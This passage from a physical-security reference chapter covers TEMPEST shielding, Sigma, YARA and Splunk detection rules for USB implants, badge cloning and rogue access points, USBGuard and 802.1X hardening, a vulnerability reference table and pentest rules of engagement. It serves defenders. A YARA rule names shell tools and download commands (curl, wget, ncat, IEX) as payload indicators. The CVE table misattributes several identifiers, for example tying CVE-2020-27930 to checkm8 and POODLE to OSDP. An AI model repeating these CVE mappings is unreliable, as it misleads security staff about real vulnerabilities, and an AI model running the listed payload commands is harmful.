| **Zone C** | AMSG 784 | Reduced (~40-60 dB) | ~100 m secure perimeter | Military installation with controlled buffer zone |

Zone classification drives procurement costs (Zone A equipment: 5-20x commercial equivalents) and is determined by TEMPEST threat assessment of SIGINT collector proximity.

### 19E.3 Shielding materials and techniques

| Material | Shielding Effectiveness (SE) | Application | Cost Factor |
|----------|------------------------------|-------------|-------------|
| **Copper mesh (100 mesh)** | 80–100 dB at 1 GHz | Room-level Faraday cage | High |
| **Conductive paint (nickel/copper)** | 40–60 dB at 1 GHz | Retrofit wall coating | Medium |
| **Mu-metal** | 40–60 dB at low frequencies (< 1 MHz) | Magnetic field shielding | Very high |
| **Aluminum sheet (1 mm)** | 60–80 dB at 1 GHz | Panel-based enclosures | Medium |
| **Conductive gaskets (BeCu)** | Seam treatment, maintains SE at joints | Door frames, panel joints | High |
| **Waveguide air vents** | 60–100 dB (depends on cell size vs frequency) | HVAC penetrations | High |
| **EMI power-line filters** | 60–80 dB (differential + common mode) | Power entry points | Medium |

Overall SE is limited by the weakest point — a single unsealed seam or degraded gasket can reduce room SE by 30-40 dB. Periodic verification per IEEE 299 or MIL-STD-188-125 is mandatory.

### 19E.4 TEMPEST-rated equipment standards

- **NSTISSAM TEMPEST/1-92:** U.S. national TEMPEST standard defining emanation test procedures and limits. Classified document — detailed limits not publicly available.
- **CNSS Policy No. 300:** Governs U.S. national policy on TEMPEST countermeasures.
- **NATO SDIP-27 (Levels A/B/C):** Equipment certification levels matching the zone model above.
- **BSI Zone Model (Germany):** German equivalent, zones 1-3 mapping roughly to NATO C/B/A.
- **Common Criteria (CC):** TEMPEST evaluation under Common Criteria uses specific Protection Profiles (e.g., BSI-CC-PP-0081 for TEMPEST IT products).

TEMPEST-rated equipment is manufactured by certified vendors (General Dynamics, L3Harris, Elbit Systems) and tested in accredited labs. Certification: $50K–$500K per product, government/military procurement channels only.

---

## 19F. Detection and Monitoring

### 19F.1 Sigma detection rules

**Rule 1 — Unauthorized USB HID device connected:**

```yaml
title: Unauthorized USB HID Device Connection
id: a1b2c3d4-1111-4aaa-bbbb-000000000001
status: stable
description: Detects USB HID devices not in approved whitelist
date: 2025-03-15
references: ["https://attack.mitre.org/techniques/T1200/"]
logsource: { product: linux, service: syslog }
detection:
  selection: { EventType: 'usb_device_connect', DeviceClass: '03' }
  filter_known:
    VendorID|contains: ['046d', '04f2', '1050']  # Logitech, Chicony, Yubico
  condition: selection and not filter_known
level: high
tags: [attack.initial_access, attack.t1200]
```

**Rule 2 — After-hours badge access:**

```yaml
title: Badge Access Outside Business Hours
id: a1b2c3d4-2222-4aaa-bbbb-000000000002
status: stable
description: Badge access events outside 0600-2200
date: 2025-03-15
references: ["https://attack.mitre.org/techniques/T1078.001/"]
logsource: { product: access_control, service: badge_reader }
detection:
  selection: { EventType: 'badge_access_granted' }
  timeframe: [{ time_of_day: '22:00-06:00' }]
  filter_authorized:
    BadgeGroup|contains: ['after_hours_authorized', 'security_staff', 'facilities_maintenance']
  condition: selection and not filter_authorized
level: medium
tags: [attack.initial_access, attack.t1078.001]
```

**Rule 3 — Badge cloning (impossible travel):**

```yaml
title: Badge Cloning Detection - Impossible Travel
id: a1b2c3d4-3333-4aaa-bbbb-000000000003
status: stable
description: Same badge at distant readers within impossible travel time — indicates cloning
date: 2025-03-15
references: ["https://attack.mitre.org/techniques/T1200/"]
logsource: { product: access_control, service: badge_reader }
detection:
  selection: { EventType: 'badge_access_granted' }
  condition: selection | near selection by BadgeID within 120s where ReaderLocation != ReaderLocation
  # Splunk: | transaction BadgeID maxspan=120s | where mvcount(ReaderLocation) > 1
  # Elastic: group by badge_id, time bucket 120s, cardinality(reader_location) > 1
level: critical
tags: [attack.initial_access, attack.t1200]
```

### 19F.2 YARA rules

**Rule 1 — DuckyScript payload detection:**

```yara
rule DuckyScript_Payload
{
    meta:
        description = "Detects DuckyScript payload files (USB Rubber Ducky, Flipper Zero BadUSB)"
        author = "Physical Security Team"
        date = "2025-03-15"
        severity = "high"
        reference = "https://docs.hak5.org/hak5-usb-rubber-ducky/duckyscript-tm-quick-reference"

    strings:
        $cmd_gui_r     = "GUI r" ascii nocase
        $cmd_gui_space = "GUI SPACE" ascii nocase
        $cmd_string    = "STRING " ascii
        $cmd_delay     = "DELAY " ascii
        $cmd_enter     = /^ENTER$/m ascii
        $cmd_repeat    = "REPEAT " ascii
        $cmd_ctrl_alt  = /CTRL[\s\-]ALT/ ascii nocase

        $payload_ps    = "powershell" ascii nocase
        $payload_wget  = "wget " ascii nocase
        $payload_curl  = "curl " ascii nocase
        $payload_iex   = "IEX(" ascii nocase
        $payload_nc    = "ncat " ascii nocase
        $payload_bash  = "/bin/bash" ascii

    condition:
        (2 of ($cmd_*)) and (1 of ($payload_*))
}
```

**Rule 2 — BadUSB firmware signatures:**

```yara
rule BadUSB_Firmware_Signature
{
    meta:
        description = "Detects firmware images associated with known BadUSB attack platforms"
        author = "Physical Security Team"
        date = "2025-03-15"
        severity = "critical"
        reference = "https://attack.mitre.org/techniques/T1200/"

    strings:
        // USB Rubber Ducky inject.bin header patterns
        $ducky_header  = { 00 00 FF 00 }
        $ducky_delay   = { 00 00 00 FF }

        // O.MG cable firmware identifiers
        $omg_ssid      = "O.MG" ascii
        $omg_endpoint  = "/api/cmd" ascii
        $omg_wifi      = "espressif" ascii nocase

        // Flipper Zero BadUSB app identifiers
        $flipper_meta  = "Filetype: Flipper" ascii
        $flipper_badusb = "BadUSB" ascii

        // Generic HID attack indicators in firmware
        $hid_desc      = { 05 01 09 06 A1 01 }  // USB HID keyboard descriptor
        $hid_string_inject = "STRING " ascii

        // Digispark/ATtiny85 BadUSB patterns
        $digispark     = "DigiKeyboard" ascii
        $attiny_hid    = "TrinketHidCombo" ascii

    condition:
        (any of ($ducky_*)) or
        (2 of ($omg_*)) or
        ($flipper_meta and $flipper_badusb) or
        ($hid_desc and $hid_string_inject) or
        (any of ($digispark, $attiny_hid))
}
```

### 19F.3 USBGuard advanced policy

```bash
# /etc/usbguard/rules.conf — hardened USB policy
allow id 046d:c52b with-interface equals { 03:01:01 } name "Logitech Unifying Receiver"
allow id 04f2:0112 with-interface equals { 03:01:01 } name "Chicony Keyboard"
allow id 046d:c077 with-interface equals { 03:01:02 } name "Logitech Mouse"
allow id 1050:0407 with-interface one-of { 03:00:00 03:01:01 0b:00:00 } name "YubiKey"
reject with-interface one-of { 03:00:00 03:01:00 03:01:01 03:01:02 }  # block unknown HID
allow id 0781:* with-interface equals { 08:06:50 } name "SanDisk Storage"
reject with-interface equals { 08:*:* }         # block unknown mass storage
reject with-interface all-of { 03:*:* 02:*:* }  # block composite HID+CDC (O.MG detection)
reject                                           # default deny
```

```bash
sudo systemctl enable --now usbguard
sudo usbguard watch                    # real-time USB event monitoring
sudo usbguard list-devices --blocked   # audit policy violations
```

### 19F.4 802.1X wired NAC configuration

**RADIUS server (FreeRADIUS) — basic 802.1X config:**

```bash
# /etc/freeradius/3.0/clients.conf — switch as RADIUS client
client switch-floor2 {
    ipaddr = 192.168.1.10
    secret = <strong_shared_secret>
    shortname = switch-floor2
}

# /etc/freeradius/3.0/sites-enabled/default — EAP authentication
authorize {
    eap {
        default_eap_type = tls   # certificate-based (EAP-TLS), strongest
        # alternative: peap for username/password with inner MSCHAPv2
    }
}
```

**Cisco switch port security (802.1X + port security):**

```
! Enable 802.1X globally
dot1x system-auth-control

! Configure access port with 802.1X
interface GigabitEthernet0/1
  switchport mode access
  switchport access vlan 10
  authentication port-control auto
  dot1x pae authenticator
  ! MAC address limit (prevents hub/switch insertion)
  switchport port-security maximum 1
  switchport port-security violation restrict
  switchport port-security
  ! Guest VLAN for unauthenticated devices (quarantine)
  authentication event no-response action authorize vlan 999
  ! RADIUS server group
  authentication order dot1x mab
  ! MAB fallback for non-802.1X devices (printers, etc.)
  mab
```

Unauthenticated devices (implants, rogue switches, Packet Squirrel) are quarantined in VLAN 999 with no connectivity.

### 19F.5 Wireless IDS — Kismet

Kismet is a wireless network detector, sniffer, and IDS capable of detecting rogue access points, unauthorized wireless devices, and wireless implants.

```bash
# Start Kismet with monitoring interface
kismet -c wlan0mon

# Kismet detects and alerts on:
# - Rogue APs (SSIDs matching corporate SSID but unauthorized BSSID)
# - Evil twin attacks (duplicate SSIDs with different BSSIDs)
# - ESPKey/BLEKey WiFi APs (SSID patterns: ESPKey_*, BLEKey_*)
# - Unauthorized Bluetooth/BLE devices
# - Deauthentication attacks (flood of deauth frames)
# - Probe request harvesting

# Kismet REST API for integration with SIEM:
curl -s http://localhost:2501/devices/all_devices.json | \
  jq '.[] | select(.kismet_device_base_type == "Wi-Fi AP")'

# Alert configuration in /etc/kismet/kismet_alerts.conf:
# alert=ADDSSIDEVIL,5/min,1/sec
# alert=BSSTIMESTAMP,5/min,1/sec
# alert=DEAUTHFLOOD,5/min,1/sec
```

Deploy Kismet sensors at facility perimeter and sensitive areas. Feed alerts to SIEM for correlation with physical access events.

---

## 19G. Hardening Checklist

| Control Category | Current (Weak) | Recommended (Strong) | Implementation |
|-----------------|----------------|---------------------|----------------|
| **Access Control — Reader Protocol** | Wiegand 26-bit (plaintext, no encryption, replay-vulnerable) | OSDP v2 with AES-128 Secure Channel Protocol | Replace readers → OSDP-capable models (HID Signo, Mercury LP); upgrade panels to OSDP support; configure SCP keys; disable Wiegand fallback on all panels |
| **Access Control — Credential Technology** | MIFARE Classic (Crypto-1 broken, cloneable in seconds) | DESFire EV3 with AES-128 mutual authentication and diversified per-site keys | Issue new DESFire EV3 cards; configure application-level keys diversified per organization; enroll in access control system; decommission all MIFARE Classic credentials; block legacy card types at reader |
| **USB Port Security** | No USB device restrictions (any HID device accepted, BadUSB viable) | USBGuard whitelist policy + EDR USB device control | Deploy USBGuard (Linux) or EDR USB control (Windows/macOS); create per-site VID:PID whitelist; default-reject HID class 03; alert on blocked devices; review policy quarterly |
| **Cold Boot Defense** | BitLocker with TPM-only (key auto-loaded to RAM, extractable via cold boot) | TPM + PIN pre-boot + hardware memory encryption (AMD SME/SEV or Intel TME/MKTME) | Enable BitLocker pre-boot PIN via Group Policy; select hardware with AMD SME or Intel TME support; enable memory encryption in BIOS/UEFI; disable Thunderbolt DMA or enforce IOMMU |
| **TEMPEST Countermeasures** | Standard commercial equipment, unshielded facility (emanations readable at distance) | Zone-appropriate TEMPEST controls per NATO SDIP-27 assessment | Conduct TEMPEST threat assessment; determine zone classification; install appropriate shielding (copper mesh, conductive paint, filtered power); procure TEMPEST-rated equipment for Zone A/B areas; periodic SE verification testing |
| **Network Implant Prevention** | Open switch ports, no NAC, no physical inspection program | 802.1X on all ports + scheduled physical infrastructure audits | Enable 802.1X (EAP-TLS) on all switch ports; configure quarantine VLAN for unauthenticated devices; implement monthly physical inspection of network closets, reader wiring, and underfloor cabling; deploy Kismet for rogue wireless detection |
| **Lock Security** | Standard pin tumbler (pickable in seconds, bump-vulnerable) | High-security locks with UL 437 / EN 1303 Grade 6 certification | Replace critical-path locks with Abloy Protec2, Medeco M3, or ASSA Twin Pro; install latch guards on all exterior doors; add hinge security pins; eliminate exposed hinges; add door-position sensors integrated with IDS |

---

## 19H. CVE Reference Table

| ID / Reference | Affected Component | Year | Description | CVSS | CWE |
|---------------|-------------------|------|-------------|------|-----|
| **Crypto-1 (Garcia et al., "Dismantling MIFARE Classic")** | MIFARE Classic (NXP) | 2008 | Reverse-engineered Crypto-1 cipher; full key recovery in seconds from 1-2 authentication traces. All MIFARE Classic cards are cloneable. | N/A (no CVE assigned) | CWE-327 (Use of Broken Crypto) |
| **HID iCLASS Master Key (Meriac, "Heart of Darkness")** | HID iCLASS Standard | 2012 | Extracted and published the HID iCLASS legacy master key, enabling read/clone of all iCLASS Standard credentials worldwide. | N/A (no CVE assigned) | CWE-321 (Use of Hard-coded Cryptographic Key) |
| **Wiegand Protocol (inherent)** | All Wiegand-based access control | 1980s–present | Wiegand protocol transmits credentials in plaintext with no authentication, encryption, or replay protection. Eavesdropping and replay are trivial with ESPKey/BLEKey. | N/A (design flaw, no CVE) | CWE-319 (Cleartext Transmission of Sensitive Information) |
| **CVE-2014-3566 (POODLE)** | SSL 3.0 in OSDP v1 implementations | 2014 | Early OSDP implementations used SSL 3.0 for encryption; POODLE attack downgrades and decrypts. OSDP v2 mandates AES-128 SCP. | 3.4 | CWE-310 (Cryptographic Issues) |
| **BadUSB (Nohl and Lell, "BadUSB — On Accessories That Turn Evil")** | USB firmware (universal) | 2014 | Demonstrated reprogramming USB controller firmware to emulate HID devices. Any USB device with reprogrammable firmware can become a BadUSB attack vector. Fundamentally unfixable at protocol level. | N/A (no CVE assigned) | CWE-1283 (Mutable Attestation or Installation Data) |
| **CVE-2019-0090** | Intel CSME (Converged Security and Management Engine) | 2019 | ROM vulnerability in Intel CSME allows physical attacker to extract platform encryption keys via DMA, compromising hardware root of trust. | 7.1 | CWE-119 (Buffer Overflow) |
| **Thunderclap (CVE-2019-15505 and related)** | Thunderbolt DMA on Linux/macOS/Windows | 2019 | Malicious Thunderbolt devices bypass IOMMU protections via protocol-level vulnerabilities, enabling DMA attacks despite OS security. Demonstrated full memory access on patched systems. | 7.8 | CWE-284 (Improper Access Control) |
| **Cold Boot 2018 (F-Secure, Olle Segerdahl and Pasi Saarinen)** | BitLocker, FileVault, LUKS (all FDE) | 2018 | Demonstrated that modern firmware memory-overwrite mitigations can be bypassed by manipulating BIOS settings via cold boot, recovering FDE keys from RAM. Affects virtually all laptops. | N/A (design limitation) | CWE-311 (Missing Encryption of Sensitive Data) |
| **CVE-2020-10713 (BootHole)** | GRUB2 bootloader (Secure Boot bypass) | 2020 | Buffer overflow in GRUB2 `grub.cfg` parser allows arbitrary code execution during Secure Boot, bypassing hardware-rooted chain of trust. Enables evil maid bootloader replacement. | 8.2 | CWE-120 (Buffer Overflow) |
| **TEMPEST (van Eck, 1985; Kuhn, 2004)** | All electronic equipment | 1985–present | Electromagnetic emanations from displays, keyboards, and network cables reconstructable at distance. Ongoing research extends to HDMI, USB, and modern display protocols. | N/A (physical side-channel) | CWE-200 (Exposure of Sensitive Information) |
| **CVE-2020-27930 (checkm8 / FORCEDENTRY related)** | Apple Secure Boot (A5–A11 SoC) | 2019–2020 | Use-after-free in SecureROM DFU mode enables unpatchable code execution during boot on affected Apple SoCs. Enables persistent evil maid implants on iPhones/iPads. | 7.8 | CWE-416 (Use After Free) |
| **Rogue iButton (inherent)** | Dallas DS1990A (1-Wire) | 1990s–present | DS1990A iButton transmits static 48-bit serial with no authentication. Any reader accepting UID-only authentication is trivially bypassed with cloned iButton. | N/A (design limitation) | CWE-287 (Improper Authentication) |

---

## 19I. Physical Security Detection Engineering

Physical security events generate high-volume telemetry that, without correlation, produces noise instead of signal. Detection engineering for the physical domain applies the same structured rule development, tuning, and SIEM integration principles used in network and endpoint security — but against badge readers, door controllers, cameras, environmental sensors, and USB device logs.

### 19I.1 Detection Rule Categories

Physical security detection rules fall into five primary categories, each targeting a distinct attack surface or anomaly class:

| Category | Data Source | Detection Objective | Typical Alert Fidelity |
|----------|------------|---------------------|----------------------|
| **Access anomaly** | Badge reader logs (PACS) | After-hours access, unusual location, frequency anomaly | Medium — requires behavioral baseline |
| **Anti-passback violation** | Door controller paired events | Tailgating, badge sharing, credential cloning | High — deterministic rule |
| **USB device insertion** | EDR / USBGuard / syslog | Unauthorized HID, mass storage, or implant device | High — whitelist-based |
| **Rogue wireless** | WIDS / Kismet / wireless controller | Unauthorized AP, evil twin, wireless implant | Medium — environment dependent |
| **Camera tampering** | VMS analytics / NVR health | Camera obstruction, angle change, feed loss, IR flood | Medium — environmental noise |

### 19I.2 After-Hours Badge Access Detection

After-hours access is the single highest-signal indicator for unauthorized physical entry. The rule correlates badge swipe timestamps against a defined business-hours window and employee access schedules.

**Sigma rule — after-hours badge access:**

```yaml
title: After-Hours Badge Access on Restricted Door
id: d7a3c1e0-phys-4e2f-b891-detection001
status: stable
description: >
  Detects badge access events outside defined business hours
  on doors classified as restricted (server rooms, NOCs, vaults).
logsource:
  category: physical_access
  product: genetec_synergis    # Adapt: lenel_onguard, ccure_9000
detection:
  selection:
    EventType: 'ACCESS_GRANTED'
    DoorClassification|contains:
      - 'SERVER_ROOM'
      - 'NOC'
      - 'VAULT'
      - 'IDF_CLOSET'
      - 'MDF'
  filter_business_hours:
    AccessTime|timerange: '07:00..19:00'
  filter_authorized_shifts:
    BadgeHolder.ShiftType:
      - 'NIGHT_SHIFT'
      - 'ON_CALL'
      - '24X7_ACCESS'
  condition: selection and not filter_business_hours and not filter_authorized_shifts
level: high
falsepositives:
  - Authorized maintenance windows (correlate with change tickets)
  - Emergency access (verify against emergency-access log)
tags:
  - attack.initial_access
  - physical.after_hours
```

**Splunk SPL equivalent:**

```spl
index=pacs sourcetype=genetec:access EventType="ACCESS_GRANTED"
  DoorClassification IN ("SERVER_ROOM","NOC","VAULT","IDF_CLOSET","MDF")
| eval hour=strftime(_time, "%H")
| where (hour < 7 OR hour >= 19)
| lookup authorized_shifts BadgeID OUTPUT ShiftType
| where NOT ShiftType IN ("NIGHT_SHIFT","ON_CALL","24X7_ACCESS")
| stats count by BadgeID, BadgeHolder, DoorName, _time
| sort - count
```

### 19I.3 Anti-Passback Violation Detection

Anti-passback (APB) violations occur when a badge is used to enter a zone without a corresponding prior exit event — indicating tailgating, badge sharing, or cloned credentials. Deterministic APB rules are among the highest-fidelity physical detections.

**Sigma rule — anti-passback violation:**

```yaml
title: Anti-Passback Violation on Secured Zone
id: d7a3c1e0-phys-4e2f-b891-detection002
status: stable
description: >
  Fires when the PACS generates an anti-passback violation event,
  indicating the badge was used for entry without a corresponding exit.
logsource:
  category: physical_access
  product: genetec_synergis
detection:
  selection:
    EventType:
      - 'APB_VIOLATION'
      - 'ANTI_PASSBACK_HARD'
      - 'ANTI_PASSBACK_SOFT'
  condition: selection
level: high
falsepositives:
  - System clock drift between paired readers (tune NTP)
  - Door held open during authorized group entry (correlate with door-held alarm)
tags:
  - attack.initial_access
  - physical.tailgating
```

**Splunk SPL — APB clustering by badge:**

```spl
index=pacs sourcetype=genetec:access
  EventType IN ("APB_VIOLATION","ANTI_PASSBACK_HARD","ANTI_PASSBACK_SOFT")
| stats count as violation_count, values(DoorName) as doors,
        earliest(_time) as first_violation, latest(_time) as last_violation
        by BadgeID, BadgeHolder
| where violation_count > 2
| sort - violation_count
```

More than two APB violations from the same badge within a 24-hour window strongly suggests credential cloning or systematic tailgating rather than accidental pass-through.

### 19I.4 USB Device Insertion on Secured Systems

USB device insertion events on air-gapped, SCADA, or otherwise secured systems require immediate investigation. This rule operates on USBGuard logs (Linux) or EDR telemetry (Windows/macOS).

**Sigma rule — unauthorized USB HID insertion:**

```yaml
title: Unauthorized USB HID Device on Secured Host
id: d7a3c1e0-phys-4e2f-b891-detection003
status: stable
description: >
  Detects USB devices with HID class (0x03) inserted on hosts
  tagged as secured/air-gapped where USB HID is not whitelisted.
logsource:
  category: usb_device
  product: linux_usbguard     # Adapt: crowdstrike, sentinel_one, defender
detection:
  selection:
    DeviceClass: '03'          # HID
    Action: 'block'
  filter_known:
    VendorID|ProductID:
      - '046D:C52B'           # Logitech Unifying Receiver (if authorized)
  condition: selection and not filter_known
level: critical
falsepositives:
  - Authorized peripherals not yet added to whitelist (update policy)
tags:
  - attack.execution
  - attack.t1200
  - physical.usb_implant
```

**USBGuard audit log query (Linux):**

```bash
# Review blocked USB device events from the last 24 hours
journalctl -u usbguard --since "24 hours ago" | grep -E "block|reject"

# Parse structured USBGuard audit log
usbguard list-rules | grep "block"

# Real-time monitoring for new USB insertions
usbguard watch
```

**Windows Event Log query (PowerShell):**

```powershell
# USB device insertion events (Event ID 2003 = PnP device connected)
Get-WinEvent -LogName "Microsoft-Windows-DriverFrameworks-UserMode/Operational" |
  Where-Object { $_.Id -eq 2003 } |
  Select-Object TimeCreated, Message |
  Sort-Object TimeCreated -Descending |
  Select-Object -First 50
```

### 19I.5 Rogue Wireless Access Point Detection

Unauthorized wireless APs — whether attacker-planted implants (e.g., LAN Turtle with Wi-Fi, Hak5 WiFi Pineapple) or employee-installed consumer routers — represent a direct bridge from physical to network compromise.

**Kismet-based rogue AP detection (automated):**

```bash
# Continuous scan outputting to SIEM-ingestible JSON
kismet -c wlan0mon --override kismet_log_types=kismet,json \
  --override log_prefix=/var/log/kismet/scan

# Post-processing: compare discovered APs against authorized list
kismet_rest_examples/python/kismet-ap-list.py | \
  python3 -c "
import sys, json
authorized = set(open('/etc/kismet/authorized_bssids.txt').read().split())
for line in sys.stdin:
    ap = json.loads(line)
    if ap['kismet.device.base.macaddr'] not in authorized:
        print(f\"ROGUE AP: {ap['kismet.device.base.macaddr']} \"
              f\"SSID={ap.get('kismet.device.base.commonname','hidden')} \"
              f\"Signal={ap['kismet.device.base.signal']['kismet.common.signal.last_signal']}dBm\")
"
```

**Sigma rule — rogue AP detected by WIDS:**

```yaml
title: Rogue Wireless Access Point Detected
id: d7a3c1e0-phys-4e2f-b891-detection004
status: stable
description: >
  Fires when the wireless intrusion detection system identifies
  an access point not in the authorized BSSID inventory.
logsource:
  category: wireless_ids
  product: cisco_wlc          # Adapt: aruba_clearpass, meraki, kismet
detection:
  selection:
    AlertType:
      - 'ROGUE_AP_DETECTED'
      - 'UNAUTHORIZED_AP'
      - 'ROGUE_AP_ON_WIRE'
  condition: selection
level: high
tags:
  - attack.initial_access
  - physical.wireless_implant
```

### 19I.6 Camera Tampering Detection

Camera tampering — spray-painting lenses, redirecting aim, cutting cables, or IR-flooding sensors — precedes most sophisticated physical intrusions. Modern VMS platforms generate tamper events that integrate with SIEM.

**Detection indicators and data sources:**

| Tamper Method | VMS Event | Detection Logic | Response |
|--------------|-----------|----------------|----------|
| Lens obstruction (spray paint, tape, bag) | `CAMERA_OBSCURED` / `VIDEO_LOSS` | Sustained frame uniformity > 80% for > 30 seconds | Dispatch security; review adjacent cameras |
| Camera angle change | `CAMERA_MOVED` / `SCENE_CHANGE` | Reference-frame delta exceeds threshold | Alert SOC; compare stored reference image |
| Cable cut / power loss | `CAMERA_OFFLINE` / `CONNECTION_LOST` | Heartbeat failure from NVR health monitor | Dispatch security; check PoE switch port status |
| IR flood (blind night vision) | `IR_SATURATION` | Sustained IR-band saturation without corresponding visible-light change | Alert SOC; correlate with access events in the zone |
| Video injection (loop attack) | `TIMESTAMP_ANOMALY` | Frame timestamp monotonicity violation or NTP desync | Critical alert; assume active intrusion |

**Splunk SPL — camera tamper correlation:**

```spl
index=vms sourcetype=genetec:camera_health
  EventType IN ("CAMERA_OBSCURED","CAMERA_MOVED","CAMERA_OFFLINE","IR_SATURATION","TIMESTAMP_ANOMALY")
| eval severity=case(
    EventType="TIMESTAMP_ANOMALY", "CRITICAL",
    EventType="CAMERA_OFFLINE" AND Duration>300, "HIGH",
    EventType="CAMERA_OBSCURED", "HIGH",
    EventType="CAMERA_MOVED", "MEDIUM",
    1=1, "LOW")
| lookup camera_zone_map CameraID OUTPUT ZoneName, ZoneClassification
| where ZoneClassification IN ("RESTRICTED","CRITICAL")
| table _time, CameraID, CameraName, ZoneName, EventType, severity, Duration
| sort - severity
```

### 19I.7 Physical SIEM Integration Architecture

Integrating physical security systems into a centralized SIEM requires bridging proprietary protocols to standard log formats. The following architecture covers the primary data flows:

```
┌──────────────────────────────────────────────────────────────────────┐
│                        PHYSICAL SECURITY LAYER                       │
│                                                                      │
│  Badge Readers ──► PACS Panel ──► PACS Server (Genetec/Lenel/CCure) │
│  Door Contacts ──►              ──► Syslog/CEF ──────────┐          │
│  REX Sensors   ──►                                        │          │
│                                                            │          │
│  IP Cameras ──► NVR/VMS ──► Analytics Engine               │          │
│                           ──► Syslog/JSON ──────────────┐ │          │
│                                                          │ │          │
│  Environmental Sensors ──► BMS/SCADA ──► Modbus→Syslog ─┤ │          │
│  (temp, humidity, water, power)                          │ │          │
│                                                          │ │          │
│  WIDS (Kismet/Aruba) ──► Syslog/JSON ──────────────────┤ │          │
│                                                          │ │          │
│  USBGuard / EDR ──► Syslog/JSON ───────────────────────┤ │          │
│                                                          ▼ ▼          │
│                                              ┌────────────────────┐  │
│                                              │  Log Collector     │  │
│                                              │  (rsyslog/Fluentd/ │  │
│                                              │   Logstash)        │  │
│                                              └────────┬───────────┘  │
│                                                       │              │
│                                                       ▼              │
│                                              ┌────────────────────┐  │
│                                              │  SIEM              │  │
│                                              │  (Splunk/Elastic/  │  │
│                                              │   Sentinel/QRadar) │  │
│                                              └────────┬───────────┘  │
│                                                       │              │
│                                                       ▼              │
│                                              ┌────────────────────┐  │
│                                              │  SOAR Playbooks    │  │
│                                              │  (physical-        │  │
│                                              │   specific)        │  │
│                                              └────────────────────┘  │
└──────────────────────────────────────────────────────────────────────┘
```

**Log source configuration — Genetec Security Center → Syslog:**

```
# Genetec Security Center — enable syslog forwarding
# Admin Tool → System → General Settings → Events
# Syslog Server: <SIEM_COLLECTOR_IP>:514 (TCP/TLS preferred)
# Format: CEF (Common Event Format)
# Events to forward:
#   - Access Granted / Access Denied
#   - Anti-Passback Violation
#   - Door Held Open / Door Forced Open
#   - Alarm Activated / Alarm Acknowledged
#   - Camera Offline / Camera Tamper
```

### 19I.8 Behavioral Analytics for Physical Access

Static threshold rules catch obvious violations. Behavioral analytics detect subtle anomalies — a badge holder accessing an area they have never visited, a change in access-frequency patterns, or geographically impossible swipe sequences.

**Behavioral analytic use cases:**

| Use Case | Baseline Period | Anomaly Trigger | Example |
|----------|----------------|-----------------|---------|
| **Location novelty** | 90 days of access history per badge | Badge used at door never previously accessed by that holder | Engineer badges into CEO suite for the first time |
| **Frequency deviation** | 30-day rolling average per badge-door pair | Access count exceeds 3σ above mean for the pair | Normally 2 entries/day to server room; suddenly 14 |
| **Velocity anomaly** | Physical distance between readers, walking speed model | Badge used at two readers with transit time below physically possible threshold | Badge at Building A, 3 seconds later at Building B (1.2 km away) |
| **Temporal shift** | 90-day access-hour histogram per badge | Access outside the holder's historical ±2σ time window | Day-shift employee badging in at 0300 for three consecutive nights |
| **Peer group deviation** | Department/role-based access clustering | Individual's access pattern diverges from peer group centroid | All finance team members access floors 3-5; one member suddenly accessing basement telecom room |

**Splunk SPL — velocity anomaly (impossible travel):**

```spl
index=pacs sourcetype=genetec:access EventType="ACCESS_GRANTED"
| sort BadgeID, _time
| streamstats current=f last(_time) as prev_time, last(ReaderLat) as prev_lat,
    last(ReaderLon) as prev_lon, last(DoorName) as prev_door by BadgeID
| eval time_delta_sec = _time - prev_time
| eval distance_m = 6371000 * acos(
    sin(ReaderLat*pi()/180) * sin(prev_lat*pi()/180) +
    cos(ReaderLat*pi()/180) * cos(prev_lat*pi()/180) *
    cos((ReaderLon - prev_lon)*pi()/180))
| eval required_speed_ms = distance_m / time_delta_sec
| where required_speed_ms > 10 AND time_delta_sec > 0 AND time_delta_sec < 600
| eval required_speed_kmh = round(required_speed_ms * 3.6, 1)
| table _time, BadgeID, BadgeHolder, prev_door, DoorName,
    distance_m, time_delta_sec, required_speed_kmh
| sort - required_speed_kmh
```

A required speed above 10 m/s (36 km/h) between indoor readers within the same campus is physically impossible without a vehicle — strong indicator of credential cloning.

---

## 19J. Physical Penetration Testing Methodology

Physical penetration testing validates the effectiveness of physical security controls through authorized, adversarial simulation. Unlike network pentesting, physical assessments carry unique risks: legal exposure, safety hazards, and the inability to "revert" a discovered vulnerability once a tester is inside a facility.

### 19J.1 Pre-Engagement

The pre-engagement phase is non-negotiable. Physical pentests without rigorous scoping and legal coverage expose the tester to arrest, injury, or liability and the client to uncontrolled risk.

**Rules of Engagement (RoE) checklist:**

| RoE Element | Detail Required | Example |
|-------------|----------------|---------|
| **Authorization letter** | Signed by C-level or facility owner; carried on-person during assessment | "Bearer [Name] is authorized to conduct physical security testing at [Address] from [Start] to [End]." |
| **Scope boundaries** | Specific buildings, floors, rooms included/excluded | "In scope: Building A floors 1-4, parking garage. Out of scope: Building B, loading dock, executive floor 5." |
| **Techniques permitted** | Explicit list of allowed entry methods | "Lock bypass: YES. Badge cloning: YES. Social engineering of employees: YES (no impersonation of law enforcement). Destructive entry: NO." |
| **Time window** | Authorized hours for testing activities | "Business hours social engineering: Mon-Fri 0800-1800. After-hours entry attempts: Sat-Sun 2000-0600." |
| **Safety constraints** | Areas with physical hazards, safety gear requirements | "High-voltage room: escort required. Data center: ESD gear mandatory." |
| **Emergency contacts** | Client-side contacts available 24/7 during assessment | "Primary: CISO [phone]. Secondary: Facilities Director [phone]. If detained by security/police, present authorization letter and call Primary." |
| **Evidence handling** | What can be photographed, recorded, extracted | "Photography of security controls: YES. Photography of documents/screens: NO. Data extraction: simulated only (leave proof marker, do not exfiltrate real data)." |
| **Get-out-of-jail letter** | Supplementary legal document for law enforcement interaction | Must include: client name, tester name + photo ID, engagement dates, client contact for verification, attorney contact |

**Legal considerations by jurisdiction:**

Physical penetration testing intersects with trespass, breaking-and-entering, wiretapping, and impersonation statutes. The authorization letter must be jurisdiction-specific. Key considerations:

- **United States:** State-level trespass laws vary. Authorization letter must be from the legal entity that controls the premises (not just the tenant if multi-tenant building). Social engineering of non-employee third parties (visitors, delivery personnel) may fall outside the authorization scope.
- **European Union:** GDPR applies if testing involves photographing or recording individuals. Worker council notification may be required in some member states (Germany: Betriebsrat). Lockpick possession is restricted in some jurisdictions (UK: going equipped under Theft Act 1968).
- **General principle:** When in doubt, consult legal counsel before the engagement. The authorization letter is not a substitute for compliance with local law.

### 19J.2 Reconnaissance

Physical reconnaissance gathers intelligence on the target facility before any entry attempt. The objective is to identify access points, security control placement, employee patterns, and environmental factors.

**Passive reconnaissance techniques:**

| Technique | Tools | Intelligence Gathered |
|-----------|-------|----------------------|
